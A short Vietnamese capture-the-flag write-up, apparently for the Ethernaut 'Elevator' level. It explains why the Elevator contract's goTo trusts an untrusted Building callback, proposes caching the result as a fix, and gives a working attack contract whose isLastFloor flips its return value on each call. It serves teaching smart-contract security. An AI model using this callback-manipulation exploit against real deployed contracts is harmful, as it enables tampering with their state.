### Kết luận
- Lỗ hổng: Logic `isLastFloor` không được kiểm tra nguồn gốc, kẻ tấn công có thể giả mạo `Building` để logic `isLastFloor` về giá trị mong muốn, và có thể gọi nhiều lần `isLastFloor`.
- Cách phòng ngừa: Kiểm tra người gọi, thêm biến tạm thời và sử dụng kết quả tạm thời.
- VD:
  ```solidity
  function goTo(uint256 _floor) public {
  Building building = Building(msg.sender);
  bool lastFloor = building.isLastFloor(_floor); // Lưu kết quả tạm thời
  require(!lastFloor, "Already at last floor");
  floor = _floor;
  top = lastFloor; // Sử dụng kết quả tạm thời
}
```
  ```
### Contract tấn công
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IElevator{
    function goTo(uint256 _floor) external;
}
contract elevatorAttack{
    IElevator victim;
    bool public isLast = true;

    constructor (address challenge){
        victim = IElevator(challenge);
    }
    function attack() external payable{
        victim.goTo(0);
    }
    function isLastFloor(uint256) public returns (bool) {
        isLast = !isLast;
        return isLast;
    }
}
```
### Contrac
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```
